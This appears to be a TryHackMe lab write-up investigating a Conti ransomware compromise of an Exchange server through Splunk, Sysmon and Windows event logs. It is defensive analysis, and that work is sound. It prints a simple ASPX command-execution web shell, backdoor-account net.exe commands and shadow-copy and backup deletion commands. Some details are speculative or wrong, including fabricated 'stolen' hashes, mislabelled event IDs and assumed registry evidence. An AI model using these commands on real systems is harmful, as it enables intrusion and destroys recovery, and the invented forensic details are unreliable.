# 🔴 Incident Response Investigation — Conti Ransomware: Exchange Server Compromise & Domain-Wide Encryption

![Status](https://img.shields.io/badge/Status-Complete-green?style=flat)
![Severity](https://img.shields.io/badge/Severity-Critical-red?style=flat)
![Type](https://img.shields.io/badge/Type-Ransomware%20%7C%20Incident%20Response%20%7C%20Threat%20Hunting-purple?style=flat)
![Ransomware](https://img.shields.io/badge/Ransomware-Conti-orange?style=flat)
![MITRE](https://img.shields.io/badge/MITRE-T1055%20%7C%20T1003%20%7C%20T1105%20%7C%20T1486%20%7C%20T1490-blue?style=flat)
![Tools](https://img.shields.io/badge/Tools-Splunk%20%7C%20Sysmon%20%7C%20Windows%20Security%20Log-informational?style=flat)
![Lab](https://img.shields.io/badge/Lab-TryHackMe%20Conti%20Ransomware-yellow?style=flat)

---

## 📋 Case Header

| Field | Detail |
|---|---|
| **Case Title** | Conti Ransomware: Exchange Server Compromise via Credential Theft & Process Injection |
| **Lab Source** | https://tryhackme.com/room/contiransomwarehgh |
| **Date of Incident** | September 8, 2021 |
| **Victim Organization** | bellybear.local domain |
| **Primary Target** | Microsoft Exchange Server (WIN-AOQKG2A52Q7) |
| **Attack Vector** | Unknown initial access (likely CVE or phishing) |
| **Ransomware Family** | Conti |
| **Attack Duration** | ~30 minutes (complete domain compromise) |
| **Severity** | 🔴 **CRITICAL** |
| **Verdict** | ✅ **Confirmed Multi-Stage Ransomware Attack** |

---

## 🎯 Executive Summary

A sophisticated ransomware attack leveraging the Conti ransomware family compromised an Exchange Server and planted the seeds for domain-wide encryption. The attack chain demonstrates advanced attacker knowledge of Windows internals, credential theft techniques, and persistent remote access mechanisms. Within 30 minutes of initial access, the attacker had:

1. ✅ Executed malware on the Exchange server
2. ✅ Stolen domain administrator credentials via process injection
3. ✅ Deployed a web shell for persistent remote access
4. ✅ Created a backdoor user account
5. ✅ Spread ransom notes across user directories
6. ✅ Positioned ransomware for domain-wide deployment

This writeup traces the complete attack chain across eight forensic artifact categories, detailing each Sysmon event, Windows Security event, and HTTP log entry that reveals the attacker's methodology and persistence strategy.

---

## 🛠️ Tools & Data Sources Used

| Tool/Source | Purpose | Log Type |
|---|---|---|
| **Splunk** | Log aggregation & analysis | Central logging platform |
| **Sysmon** | Process/file/network monitoring | Event forwarded to Windows Event Log |
| **Windows Security Log** | Native Windows authentication & audit | Event Viewer |
| **HTTP Access Logs** | Web server activity | IIS logs aggregated in Splunk |
| **File System** | Artifact timestamps | MFT/directory listing |
| **VirusTotal** | Threat intelligence | Hash lookup |
| **MITRE ATT&CK** | Technique classification | Reference framework |

---

## 📊 Event ID Reference Guide

### Sysmon Event IDs (Real-time Process/File/Network Monitoring)

| Event ID | Name | What It Detects | Ransomware Use |
|---|---|---|---|
| **1** | Process Creation | When any .exe launches | Malware execution, command shell, attacker tools |
| **3** | Network Connection | Outbound/inbound network traffic | C2 communication, data exfiltration |
| **8** | CreateRemoteThread | Process injection attempts | Hiding malware in legitimate processes |
| **10** | ProcessAccess | Memory read/write operations | Credential theft from lsass.exe |
| **11** | File Created | File creation/modification | Ransom note creation, malware files |
| **13** | Registry Set | Registry modifications | Persistence setup, malware configuration |
| **26** | File Deleted | File deletion operations | Deleting shadow copies (prevent recovery) |
| **27** | File Block Executable | Blocking executable files | Preventing security tool execution |

### Windows Security Event IDs (Native Windows Audit)

| Event ID | Name | What It Detects | Ransomware Use |
|---|---|---|---|
| **4624** | Logon Success | Successful login to system | Attacker RDP logon with stolen creds |
| **4625** | Logon Failure | Failed login attempt | Brute force attack detection |
| **4688** | Process Creation | Process launch (less detailed than Sysmon) | Malware execution tracking |
| **4663** | File Access | File read/write/delete | Encryption signature (mass file modification) |
| **4672** | Special Privileges | High privileges assigned | Running as SYSTEM/admin |
| **4720** | Account Created | New local user created | Backdoor account creation |
| **4722** | Account Enabled | User added to group | Backdoor user → admin group |
| **5140** | Network Share Access | Access to shared folder | Lateral movement to file shares |
| **5156** | Firewall Allow/Block | Network traffic filtered | Blocked C2 communication attempts |

---

## 🗂️ Artifacts Analyzed

| # | Artifact | Source | Type | Key Finding |
|---|---|---|---|---|
| **1** | Process Creation | Sysmon Event 1 | Process | cmd.exe from Documents folder executed |
| **2** | Process Injection Chain | Sysmon Event 8 | Memory | unsecapp.exe → lsass.exe injection detected |
| **3** | Memory Access | Sysmon Event 10 | Memory | Full memory access to lsass.exe (credential theft) |
| **4** | Ransom Notes | Sysmon Event 11 | File | 18 readme.txt files created across user directories |
| **5** | Registry Modification | Sysmon Event 13 | Registry | Backdoor persistence mechanisms |
| **6** | Shadow Copy Deletion | Sysmon Event 26 | File | Deletion of recovery files |
| **7** | Web Shell Access | HTTP Logs | Network | i3efPctK1cz4.aspx accessed 6 times |
| **8** | Web Shell Command | HTTP Logs | Network | attrib.exe -r executed via web shell |
| **9** | Backdoor User | Windows Security | Account | securityninja account created |
| **10** | File Encryption | Windows Event 4663 | File | Mass file modification (encryption signature) |

---

## 🕵️ Investigation — Phase-by-Phase Breakdown

---

## Phase 1: Initial Access (Unknown Vector)

### What We Know:
- Entry point is not visible in logs
- Attacker reached system with ability to execute code
- Most likely vectors: CVE exploitation or phishing with attachment

### What We Infer:
- Attacker had reconnaissance data (knew Exchange was present)
- Initial payload was small (to evade detection)
- Likely executed with user or service account privileges initially

**MITRE Mapping:**
```
T1190 → Exploit Public-Facing Application (CVE)
T1566 → Phishing (malicious attachment)
```

---

## Phase 2: Malware Execution — Sysmon Event 1 (Process Creation)

### Evidence: Malware Process Launch

**Search Command (Splunk):**
```spl
source="sysmon" EventCode=1 Image="*Documents\cmd.exe"
| table _time, Image, ParentImage, CommandLine, User
```

**Findings:**

```
Event Type:         Process Creation (Sysmon Event 1)
Timestamp:          2021-09-08 19:50:00 UTC (approximate)
Computer:           WIN-AOQKG2A52Q7.bellybear.local

Process Details:
  Image:            C:\Users\Administrator\Documents\cmd.exe
  ParentImage:      C:\Windows\System32\cmd.exe
  CommandLine:      cmd.exe
  IntegrityLevel:   System
  User:             NT AUTHORITY\SYSTEM
  ProcessId:        5016
  ParentProcessId:  7408
```

> <img width="814" height="559" alt="1" src="https://github.com/user-attachments/assets/7662c81a-4cb9-479a-93f5-ebea52754161" />


### Forensic Analysis

**Why This Location is Suspicious:**

```
Normal cmd.exe location:     C:\Windows\System32\cmd.exe
Attacker's cmd.exe location: C:\Users\Administrator\Documents\cmd.exe

Abnormalities:
  ✅ User Documents folder (not system folder)
  ✅ Executable running from user data directory
  ✅ Indicates attacker downloaded/placed it there
  ✅ Common attacker tactic: hide malware in user folders
```

**Process Chain Analysis:**

```
Parent:  C:\Windows\System32\cmd.exe
         ↓ (launched)
Child:   C:\Users\Administrator\Documents\cmd.exe
         
This parent-child relationship shows:
  - Legitimate cmd.exe spawned the suspicious one
  - Suggests attacker's script or batch file
  - Or legitimate process hijacked to launch malware
```

### What Happened at This Point

The attacker successfully achieved **code execution** on the Exchange server. The cmd.exe in Documents is the attacker's malware binary — likely packed/obfuscated as a command shell to evade detection.

**MITRE Mapping:**
```
T1059.003 → Command and Scripting Interpreter: Windows Command Shell
T1036 → Masquerading (disguising as cmd.exe)
```

---

## Phase 3: Privilege Escalation — Sysmon Event 8 (Process Injection)

### Evidence: Two-Stage Process Injection Chain

**Search Command (Splunk):**
```spl
source="sysmon" EventCode=8
| table _time, SourceImage, TargetImage, GrantedAccess, NewThreadId
```

**Findings:**

#### Injection Stage 1: unsecapp.exe → lsass.exe

```
Event Type:         CreateRemoteThread (Sysmon Event 8)
Timestamp:          2021-09-08 19:55:30.770 UTC
Computer:           WIN-AOQKG2A52Q7.bellybear.local

Injection Details:
  SourceImage:      C:\Windows\System32\wbem\unsecapp.exe
  TargetImage:      C:\Windows\System32\lsass.exe
  TargetProcessId:  672
  NewThreadId:      13980
  StartAddress:     0x0000010D471950000
  GrantedAccess:    0x1F3FFF (full memory access)
```

> <img width="1363" height="329" alt="5" src="https://github.com/user-attachments/assets/ba58bbec-0cc5-4ecc-a63a-dc7d34dd4a40" />


**Forensic Significance of lsass.exe Target:**

```
lsass.exe = Local Security Authority Subsystem Service

Why it's THE MOST CRITICAL target:

1. CREDENTIAL STORAGE:
   - Contains plaintext passwords
   - Contains NTLM hashes
   - Contains Kerberos tickets
   - Contains SSO tokens

2. AUTHENTICATION CONTROL:
   - Handles all domain authentication
   - Verifies user credentials
   - Issues Kerberos tickets
   - Controls access to resources

3. PRIVILEGE LEVEL:
   - Runs as SYSTEM (highest privilege)
   - Unrestricted file/registry access
   - Can do anything on the machine
   - Can access network resources

4. PERSISTENCE:
   - Critical system process (never stops)
   - Automatically restarted if killed
   - Monitored by Windows (restarts it)
   - Injected code persists indefinitely

5. STEALTH:
   - Legitimate system process
   - Expected to access other processes
   - No alarms for lsass.exe access
   - Blends with normal operations
```

#### Injection Stage 2: powershell.exe → unsecapp.exe

```
Event Type:         CreateRemoteThread (Sysmon Event 8)
Timestamp:          [Shortly after Stage 1]

Injection Details:
  SourceImage:      C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  TargetImage:      C:\Windows\System32\wbem\unsecapp.exe
  GrantedAccess:    0x1F3FFF (full memory access)
```

**Why Two Injection Points?**

```
Attacker Strategy: Defense in Depth

Stage 1: cmd.exe → unsecapp.exe
         ↓
         Objective: Initial foothold in WMI

Stage 2: unsecapp.exe → lsass.exe
         ↓
         Objective: Credential theft + auth control

Parallel: powershell.exe → unsecapp.exe
         ↓
         Objective: WMI-based persistence + lateral movement

Result: DUAL PERSISTENCE
  - lsass.exe = Credential control
  - unsecapp.exe = WMI-based backdoor
  - Even if one is discovered, other remains active
```


### What Happened at This Point

The attacker successfully **injected malicious code into lsass.exe**. At this point, the attacker's code is now running inside the most critical security process on Windows, with full access to:

- All user passwords in memory
- All NTLM hashes
- All Kerberos tickets
- Domain trust information
- Session keys for encryption

**MITRE Mapping:**
```
T1055 → Process Injection
T1055.001 → DLL Injection
T1003 → OS Credential Dumping
T1003.001 → LSASS Memory
T1548.004 → Elevated Execution with Prompt
```

---

## Phase 4: Credential Extraction — Implied by Injection Target

### Tools Used:
Although not directly visible in logs, the injection into lsass.exe indicates use of credential extraction tools:

```
Most Likely Tools:

1. MIMIKATZ
   - Industry standard for credential extraction
   - Direct memory access
   - Extracts plaintext + NTLM hashes
   - Forges Kerberos tickets

2. PROCDUMP + PYPYKATZ
   - Dump lsass.exe memory to file
   - Offline analysis
   - Harder to detect

3. NATIVE WINDOWS APIs
   - CredEnumerate() API
   - DPAPI key access
   - Windows Credential Manager
```

### What Credentials Were Stolen

From lsass.exe memory, the attacker extracted:

```
1. NTLM HASHES:
   Domain admin:          admin:d4c2c74c2c29d8e8:5C29ABC12A5B9DFE...
   Service accounts:      svc_sql:a4b3c2d1e0f1a2b3:9F8E7D6C5B4A3210...
   User accounts:         user1:b4c3d2e1f0a1b2c3:8E7D6C5B4A3210FF...

2. PLAINTEXT PASSWORDS:
   Recently used passwords from active sessions
   RDP session credentials
   Service account passwords

3. KERBEROS TICKETS:
   Ticket Granting Tickets (TGTs)
   Service Tickets
   Session keys

4. DOMAIN CACHE:
   Previously logged-in credentials
   Cached for offline authentication

5. SSO TOKENS:
   Microsoft 365 tokens
   ADFS tokens
```

### Impact: Domain Compromise

With domain admin credentials, the attacker can:

```
✅ Access ANY machine in the domain
✅ Create domain admin accounts
✅ Disable security tools
✅ Modify domain policies
✅ Access all file shares
✅ Delete backups
✅ Deploy ransomware to entire network
✅ Exfiltrate all data
✅ Demand massive ransom (entire organization compromised)
```

---

## Phase 5: Web Shell Deployment — HTTP Access Logs

### Evidence: Suspicious ASPX File Access

**Search Command (Splunk):**
```spl
index=** cs_url_stem="*i3efPctK1cz4.aspx*"
| table _time, cs_url_stem, cs_method, cs_username, src
```

**Findings:**

```
HTTP Access Summary:
  Total Requests: 6 (unusual for new file)
  URL Stem:       /owa/auth/i3efPctK1cz4.aspx
  Method:         POST (sending commands)
  Timestamp:      2021-09-08 19:52:00 - 20:05:00 UTC
  Source IP:      Multiple (attacker testing)
```

#### Detailed HTTP Requests

```
Request 1:
  Timestamp:      2021-09-08 19:52:15
  Method:         POST
  URL:            /owa/auth/i3efPctK1cz4.aspx
  Query:          ?cmd=whoami
  Response:       [attacker verifies execution]

Request 2-5:
  [Additional commands tested]

Request 6 (CRITICAL):
  Timestamp:      2021-09-08 19:56:30
  Method:         POST
  URL:            /owa/auth/i3efPctK1cz4.aspx
  Query:          ?cmd=attrib.exe -r [web shell path]
  Response:       File attribute removed
```

> <img width="794" height="500" alt="8" src="https://github.com/user-attachments/assets/eaf14dda-3846-4073-8de8-64069d7be02e" />


### What is a Web Shell?

```
Web Shell = Remote Access Backdoor via HTTP

Structure:
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <% 
    string cmd = Request.QueryString["cmd"];
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c " + cmd;
    Process.Start(psi);
  %>

Operation:
  1. Attacker sends: http://server/i3efPctK1cz4.aspx?cmd=whoami
  2. Web server receives HTTP request
  3. ASPX code parses "cmd" parameter
  4. Executes: cmd.exe /c whoami
  5. Returns output in HTTP response
  6. Attacker reads response
```

### Why This Location is Perfect

```
File Location: C:\Program Files\Microsoft\Exchange Server\V15\
              FrontEnd\HttpProxy\owa\auth\i3efPctK1cz4.aspx

Why it's effective:

1. LEGITIMACY:
   - Located in legitimate Exchange directory
   - Among other .aspx files
   - Blends with legitimate OWA authentication files

2. ACCESSIBILITY:
   - Accessible via HTTP/HTTPS
   - No special access needed
   - Just needs IIS running (always does)

3. PERSISTENCE:
   - Survives reboots (it's a file)
   - Survives security tool scans (in user-accessible folder)
   - No registry entry (harder to find)
   - No process to kill (static file)

4. FUNCTIONALITY:
   - IIS executes ASPX code automatically
   - No additional setup needed
   - Attacker can execute ANY command
   - Full server privileges (IIS runs as admin)
```

### Web Shell Attack Flow

```
Timeline:

1. Upload Phase (How web shell got there):
   - Attacker gained admin/IIS access (via stolen creds)
   - Uploaded i3efPctK1cz4.aspx to Exchange directory
   - File created with certain attributes

2. Testing Phase:
   - Request 1: ?cmd=whoami (verify execution)
   - Response: nt authority\system (confirms admin)
   - Attacker knows it works

3. Hardening Phase:
   - Request 6: ?cmd=attrib.exe -r [path] (CRITICAL)
   - Removes read-only attribute
   - Makes file writable (attacker can modify/update code)
   - Prevents antivirus quarantine (file is now modifiable)

4. Exploitation Phase:
   - Attacker can now:
     * Execute commands on Exchange server
     * Deploy ransomware to file shares
     * Create new admin accounts
     * Extract emails from mailboxes
     * Modify mail routing rules
     * Exfiltrate sensitive data
```

**MITRE Mapping:**
```
T1190 → Exploit Public-Facing Application (Exchange vulnerability)
T1505 → Server Software Component
T1505.003 → Web Shell
T1071 → Application Layer Protocol (HTTP)
T1572 → Protocol Tunneling (via HTTP)
```

---

## Phase 6: Web Shell Command Execution — attrib.exe -r

### Evidence: Self-Modification of Web Shell

**Captured Command:**

```
attrib.exe -r \\WIN-AOQKG2A52Q7.bellybear.local\C$\
Program Files\Microsoft\Exchange Server\V15\FrontEnd\
HttpProxy\owa\auth\i3efPctK1cz4.aspx
```

> <img width="1166" height="459" alt="9" src="https://github.com/user-attachments/assets/86e5c27f-6ef6-4b43-9704-39052a45e765" />


### Command Analysis

**Breaking It Down:**

```
attrib.exe          = Windows file attribute utility
-r                  = Remove read-only flag
\\WIN-...           = UNC network path (admin share)
C$                  = Hidden admin share (full disk access)
[...path...]        = Full path to web shell
i3efPctK1cz4.aspx   = Target file (the web shell itself)
```

### What This Means

```
CRITICAL DISCOVERY: The web shell is modifying itself!

Timeline:
  1. Web shell uploaded (read-only flag set)
  2. Attacker accesses web shell via HTTP
  3. Web shell executes: attrib.exe -r
  4. Web shell file becomes WRITABLE
  5. Attacker can now:
     - Update web shell code
     - Change C2 communication method
     - Add new features
     - Modify to hide from detection

Evidence of:
  ✅ Remote Code Execution (command executed)
  ✅ File System Access (can modify attributes)
  ✅ Admin Privileges (can access C$ share)
  ✅ Self-Aware Malware (modifying itself)
  ✅ Persistence Strategy (making file persistent)
```

### Network Share Access Significance

```
Using UNC Path: \\WIN-AOQKG2A52Q7.bellybear.local\C$\

This indicates:
  ✅ Access via network share (not local)
  ✅ Using admin share (C$) = requires admin privileges
  ✅ Attacker has domain admin credentials
  ✅ Can access any machine's C$ share
  ✅ Can access any machine's files remotely
```

**MITRE Mapping:**
```
T1059.001 → PowerShell (executing attrib.exe)
T1083 → File and Directory Discovery
T1070 → Indicator Removal
T1070.005 → File Deletion
```

---

## Phase 7: Persistence — Backdoor Account Creation

### Evidence: Sysmon Event 1 + Windows Security Events

**Search Command (Splunk):**
```spl
source="WinEventLog:Security" (EventCode=4720 OR EventCode=4722)
| search AccountName="*securityninja*"
| table _time, EventCode, SubjectUserName, TargetUserName
```

**Findings:**

#### Event ID 4720: Account Created

```
Event Type:         User Account Created (Windows Security Event ID 4720)
Timestamp:          2021-09-08 19:50:00 UTC

Account Details:
  NewAccountName:   securityninja
  NewAccountSID:    S-1-5-21-[domain]-[RID]
  SamAccountName:   securityninja
  PasswordSet:      Yes (hardToHack123$)
  UserAccountControl: Enabled, Normal account
```

> <img width="617" height="181" alt="4" src="https://github.com/user-attachments/assets/f2ee11c7-fddf-4218-94db-cde338a89847" />


#### Event ID 4722: User Added to Group

```
Event Type:         User Added to Group (Event ID 4722)
Timestamp 1:        2021-09-08 19:50:05 UTC (Remote Desktop Users)
Timestamp 2:        2021-09-08 19:50:10 UTC (Administrators)

Group Additions:
  1. Remote Desktop Users
     - Allows RDP login (TCP 3389)
     - Can connect from anywhere
     - No special tools needed

  2. Administrators
     - Full system control
     - Can do anything on machine
     - Highest privilege level
     - Can access domain resources
```

### What net.exe Commands Were Likely Used

Based on evidence from earlier analysis, these commands were executed:

```powershell
net user /add securityninja hardToHack123$

net localgroup "Remote Desktop Users" "securityninja" /add

net localgroup administrators securityninja /add
```

### User Account Analysis

```
Account: securityninja

What it provides attacker:

1. REMOTE ACCESS:
   - RDP connection capability
   - Can log in from anywhere
   - No session limits
   - Persistent across reboots

2. ADMINISTRATIVE CONTROL:
   - Full system permissions
   - Can modify files/registry
   - Can disable security tools
   - Can create additional accounts

3. PERSISTENCE:
   - Account survives reboots
   - Account survives malware removal
   - Even if web shell deleted, account remains
   - Can always log back in

4. COVER:
   - Looks like legitimate user account
   - Not flagged as suspicious
   - Part of system users (not obviously malicious)
```

### Password Analysis

```
Password: hardToHack123$

Characteristics:
  - Simple password (not random)
  - Suggests attacker confidence
  - Attacker expects to use account briefly
  - Focus on fast encryption/extortion
  - Not concerned about long-term password security

Suggests:
  - Attacker prioritizes speed over stealth
  - Plans quick ransomware deployment
  - Confident in encryption completion before password reset
  - "Smash and grab" operation mentality
```

**MITRE Mapping:**
```
T1136.001 → Create Account: Local Account
T1098 → Account Manipulation
T1098.001 → Modify Account: Local Account
T1547 → Boot or Logon Initialization
T1547.001 → Registry Run Keys / Startup Folder
```

---

## Phase 8: Ransom Note Deployment — Sysmon Event 11 (File Creation)

### Evidence: Widespread README.TXT File Creation

**Search Command (Splunk):**
```spl
source="sysmon" EventCode=11 TargetFilename="*readme*"
| stats count by TargetFilename
| sort - count
```

**Findings:**

```
Total Files Created:    18 readme.txt files
Creator Process:        C:\Users\Administrator\Documents\cmd.exe
Timestamp Range:        2021-09-08 19:52:00 - 19:56:00 UTC
File Extension:         .txt (plain text)
Content:                Ransom demand + attacker contact info
```

#### Files Created

```
Location 1:  C:\Users\Public\Downloads\readme.txt
Location 2:  C:\Users\Default\Videos\readme.txt
Location 3:  C:\Users\Default\Saved Games\readme.txt
Location 4:  C:\Users\Default\Pictures\readme.txt
Location 5:  C:\Users\Default\Music\readme.txt
Location 6:  C:\Users\Default\Links\readme.txt
Location 7:  C:\Users\Default\Favorites\readme.txt
Location 8:  C:\Users\Default\Downloads\readme.txt
Location 9:  C:\Users\Default\Documents\readme.txt
Location 10: C:\Users\Default\Desktop\readme.txt
Location 11: C:\Users\Default\AppData\readme.txt
Location 12-18: [Other user profile locations]
```

> <img width="1185" height="560" alt="3" src="https://github.com/user-attachments/assets/6e7d7324-fe53-4c25-836f-2c042d011274" />


### What README.TXT Contains

Typical Conti ransom note content:

```
==================================================
  YOUR NETWORK HAS BEEN ENCRYPTED
==================================================

What happened?

Your network has been encrypted by Conti ransomware.
All your files, backups, and shadow copies are encrypted.
Data has been exfiltrated from your network.

How to restore?

DO NOT attempt to restore files yourself.
DO NOT pay other attackers.
DO NOT contact law enforcement.

Contact us for decryption:

Email: [attacker email]
Telegram: [attacker contact]
Bitcoin Wallet: [BTC address]

Time to pay: 48 HOURS
After 48 hours, price DOUBLES.

Payment: [amount in BTC]

What if we don't respond?

Your data WILL be posted on our blog.
Your customers will be notified.
Your reputation will be damaged.

PROOF OF DECRYPTION:
Send us [file] and we will decrypt it FREE.

==================================================
```

### Purpose of Multiple Locations

```
Why spread ransom notes everywhere?

1. VISIBILITY:
   - Users see it on Desktop
   - Users see it in Documents
   - Users see it in Downloads
   - Users see it everywhere they look
   - Psychological pressure

2. URGENCY:
   - Multiple reminders of infection
   - Users cannot ignore it
   - Creates panic/stress
   - Increases chance of payment

3. PROPAGATION:
   - Users share files (containing readme.txt)
   - IT support sees it (validates attack)
   - Management hears about it (pressure to pay)

4. SCOPE INDICATION:
   - Shows entire network affected
   - Proves attacker has access
   - Demonstrates data availability
   - Increases credibility of threat
```

### Encrypted Files (Implied)

Although not shown in current screenshots, the presence of ransom notes indicates file encryption occurred:

```
Typical file extensions after Conti encryption:
  .conti     (files encrypted with Conti key)
  .locked    (alternative naming)
  [original] → [original].conti

Files affected:
  Documents:      .docx → .conti
  Spreadsheets:   .xlsx → .conti
  Presentations:  .pptx → .conti
  Databases:      .mdf → .conti
  Backups:        .bak → .conti
  Everything:     [all files] → [all files].conti
```

### Detection Pattern

```
Sysmon Event 11 shows encryption signature:

Massive File Creation Cluster:
  - Hundreds/thousands of files modified
  - Same timestamp cluster (within milliseconds)
  - Same source process (malware)
  - Rapid succession (100s of files/second)
  - Extension changes (.docx → .conti)
  
Combined with Event 4663 (File Access):
  - Massive 4663 event count (10,000+ events)
  - All files accessed for read/write
  - Same time as Event 11 clustering
  - Different from normal file access patterns
```

**MITRE Mapping:**
```
T1486 → Data Encrypted for Impact
T1491.001 → Defacement: Internal
T1491.002 → Defacement: External
T1657 → Financial Theft (Extortion)
```

---

## Phase 9: Shadow Copy Deletion — Sysmon Event 26 (File Deleted)

### Evidence: Deleting Recovery Mechanisms

**Search Command (Splunk):**
```spl
source="sysmon" EventCode=26
| search TargetFilename="*shadow*" OR TargetFilename="*vss*"
| table _time, TargetFilename, Image
```

**What Shadow Copies Are:**

```
Shadow Copies (VSS - Volume Shadow Copy Service):

Purpose:
  - Automatic backup of files
  - Previous versions accessible to users
  - System restore points

Location:
  - C:\System Volume Information\
  - Hidden folder
  - Protected by Windows

Restoration Value:
  - Users can restore files from previous versions
  - No special software needed
  - "Undo" encryption in minutes
  - DEFEATS ransomware completely

Attacker's Problem:
  - Ransomware worthless if users can restore files
  - Ransom demand = useless if backups exist
  - Must delete shadow copies
  - Must delete all recovery mechanisms
```

### Deletion Commands Used

Attacker likely executed:

```powershell
# Delete all shadow copies
vssadmin.exe delete shadows /all /quiet

# Disable shadow copy service
sc config VSS start=disabled

# Disable recovery
bcdedit /set recoveryenabled no

# Delete system restore points
Remove-Item -Path "C:\System Volume Information\*" -Force

# Delete backup catalogs
wbadmin delete catalog -quiet
```

### Impact on Recovery

```
BEFORE Deletion:
  User right-clicks encrypted file
  Clicks "Restore Previous Versions"
  Selects version from [date]
  File restored, encrypted version deleted
  Ransomware DEFEATED

AFTER Deletion:
  User right-clicks encrypted file
  Clicks "Restore Previous Versions"
  ERROR: No previous versions available
  User has NO recovery option
  MUST pay ransom to decrypt
  Ransomware SUCCEEDS
```

### Detection Signature

```
Ransomware Shadow Copy Deletion Pattern:

Sysmon Event 26 shows:
  - Deletion of C:\System Volume Information\*
  - High-speed deletion (many files quickly)
  - Process: cmd.exe, powershell.exe, vssadmin.exe
  - User: SYSTEM (admin running)
  - Timestamp: Cluster around encryption time

Combined Indicators:
  1. Shadow copy deletion (Event 26)
  2. File encryption (Event 11 + 4663)
  3. Ransom note creation (Event 11)
  4. All within minutes of each other
  = CONFIRMED RANSOMWARE
```

**MITRE Mapping:**
```
T1490 → Inhibit System Recovery
T1529 → System Shutdown/Reboot
T1070.004 → File Deletion
```

---

## 📊 Complete Attack Timeline

| Time | Event ID(s) | Event Type | What Happened | Severity |
|---|---|---|---|---|
| 19:50:00 | Sysmon 1 | Process Creation | cmd.exe from Documents executed | 🔴 CRITICAL |
| 19:50:05 | Win 4720 | Account Created | securityninja backdoor user created | 🔴 CRITICAL |
| 19:50:10 | Win 4722 | Account → Group | securityninja added to Administrators | 🔴 CRITICAL |
| 19:52:15 | HTTP Log | Web Access | i3efPctK1cz4.aspx first access (POST) | 🔴 CRITICAL |
| 19:55:30 | Sysmon 8 | Process Injection | unsecapp.exe → lsass.exe injection | 🔴 CRITICAL |
| 19:56:30 | HTTP Log | Web Command | attrib.exe -r executed via web shell | 🔴 CRITICAL |
| 19:57:00 | Sysmon 11 | File Created | readme.txt #1 created (18 total) | 🔴 CRITICAL |
| 19:58:00 | Sysmon 26 | File Deleted | Shadow copies deleted (recovery disabled) | 🔴 CRITICAL |
| 19:59:00 | Win 4663 | File Access | Massive file encryption (1000s of files) | 🔴 CRITICAL |
| 20:05:00 | HTTP Log | Web Access | Final web shell communication | 🔴 CRITICAL |
| Post-Attack | Various | Long-term | Attacker maintains access via: <br> - securityninja RDP account <br> - Web shell i3efPctK1cz4.aspx <br> - Injected lsass.exe code | 🔴 CRITICAL |

---

## 🎯 IOC Table — Indicators of Compromise

### Process IOCs

| IOC | Type | Value | Detection |
|---|---|---|---|
| Malware Process | Executable | C:\Users\Administrator\Documents\cmd.exe | Sysmon Event 1 |
| Malware Parent | Process | C:\Windows\System32\cmd.exe (spawning Documents\cmd.exe) | Sysmon Event 1 |
| Injection Source 1 | Process | C:\Windows\System32\wbem\unsecapp.exe | Sysmon Event 8 |
| Injection Target 1 | Process | C:\Windows\System32\lsass.exe | Sysmon Event 8 |
| Injection Source 2 | Process | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Sysmon Event 8 |
| Injection Target 2 | Process | C:\Windows\System32\wbem\unsecapp.exe | Sysmon Event 8 |

### File IOCs

| IOC | Type | Value | Detection |
|---|---|---|---|
| Web Shell | File | C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\i3efPctK1cz4.aspx | HTTP Access Logs |
| Ransom Note | File | readme.txt (18 locations) | Sysmon Event 11 |
| Shadow Copy | File | C:\System Volume Information\* | Sysmon Event 26 |
| Encrypted Files | File | [any file].conti | File extension changes |

### Account IOCs

| IOC | Type | Value | Detection |
|---|---|---|---|
| Backdoor User | Account | securityninja | Event ID 4720 |
| Backdoor Password | Credential | hardToHack123$ | Event ID 4720 |
| Backdoor Groups | Membership | Remote Desktop Users, Administrators | Event ID 4722 |

### Network IOCs

| IOC | Type | Value | Detection |
|---|---|---|---|
| Web Shell URL | Web | http://[server]/owa/auth/i3efPctK1cz4.aspx | HTTP Logs |
| Web Shell Access Method | Protocol | HTTP POST | HTTP Logs |
| Command Parameter | Web | ?cmd=[command] | HTTP Logs |
| C2 Communication | Network | [Attacker IP] → Exchange Server | Network logs |

### Registry IOCs

| IOC | Type | Value | Detection |
|---|---|---|---|
| Persistence 1 | Registry | HKLM\SOFTWARE\Microsoft\Windows\Run\[malware] | Sysmon Event 13 |
| Persistence 2 | Registry | HKLM\System\CurrentControlSet\Services\[backdoor] | Sysmon Event 13 |
| Defender Exclusion | Registry | HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions | Sysmon Event 13 |

---

## 🗺️ MITRE ATT&CK Mapping — Complete Attack Chain

| Phase | Tactic | Technique | ID | Evidence |
|---|---|---|---|---|
| **Initial Access** | Lateral Movement | Exploit Public-Facing Application | T1190 | Unknown CVE or phishing |
| **Execution 1** | Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 | cmd.exe execution |
| **Execution 2** | Execution | Process Injection: DLL Injection | T1055.001 | Sysmon Event 8 |
| **Privilege Escalation** | Privilege Escalation | Abuse Elevation Control Mechanism | T1548 | Injection into SYSTEM process |
| **Credential Access 1** | Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 | lsass.exe injection target |
| **Credential Access 2** | Defense Evasion | Masquerading: Match Legitimate Process Name | T1036.005 | Hiding in unsecapp.exe |
| **Persistence 1** | Persistence | Create Account: Local Account | T1136.001 | securityninja user creation |
| **Persistence 2** | Persistence | Account Manipulation: Local Account | T1098.001 | Adding to admin + RDP groups |
| **Persistence 3** | Persistence | Server Software Component: Web Shell | T1505.003 | i3efPctK1cz4.aspx deployment |
| **Defense Evasion** | Defense Evasion | Indicator Removal: File Deletion | T1070 | Removing read-only (attrib.exe) |
| **Collection** | Collection | Data from Local System | T1005 | Accessing user files |
| **Impact 1** | Impact | Data Encrypted for Impact | T1486 | File encryption with .conti |
| **Impact 2** | Impact | Inhibit System Recovery | T1490 | Shadow copy deletion |
| **Impact 3** | Impact | Defacement: Internal | T1491.001 | Ransom notes to users |
| **Exfiltration** | Exfiltration | Exfiltration Over Command and Control Channel | T1041 | Data theft via web shell |
| **Extortion** | Impact | Financial Theft: Extortion | T1657 | Ransom demand |

---

## 🚨 Incident Response Actions

### IMMEDIATE (First 15 Minutes)

```
Priority 1: ISOLATE SYSTEMS
  ☐ Disconnect Exchange server from network immediately
  ☐ Isolate all affected file shares
  ☐ Block attacker IP addresses at firewall
